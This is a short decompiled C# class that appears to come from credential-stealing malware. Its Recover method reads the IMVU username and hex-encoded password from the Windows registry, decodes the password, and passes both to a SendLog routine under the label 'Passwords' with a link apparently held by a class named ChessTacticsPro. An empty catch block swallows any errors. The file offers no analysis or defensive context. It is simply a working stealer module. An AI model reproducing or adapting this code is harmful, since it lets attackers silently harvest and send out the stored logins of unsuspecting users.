using System;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;

// Token: 0x0200000F RID: 15
public class IMVU
{
	// Token: 0x06000047 RID: 71 RVA: 0x00003AA0 File Offset: 0x00002AA0
	public static void Recover()
	{
		checked
		{
			try
			{
				string text = Conversions.ToString(Registry.CurrentUser.OpenSubKey("Software\\IMVU\\username").GetValue(null));
				string text2 = Conversions.ToString(Registry.CurrentUser.OpenSubKey("Software\\IMVU\\password").GetValue(null));
				string text3 = null;
				for (int i = 0; i < text2.Length - 1; i += 2)
				{
					text3 += Conversions.ToString(Strings.ChrW(Convert.ToInt32(Conversions.ToString(text2[i]) + Conversions.ToString(text2[i + 1]), 16)));
				}
				string host = " ";
				string username = text;
				string password = text3;
				Send.SendLog(ChessTacticsPro.P_Link, "Passwords", null, null, "Imvu", host, username, password, null);
			}
			catch (Exception ex)
			{
			}
		}
	}
}
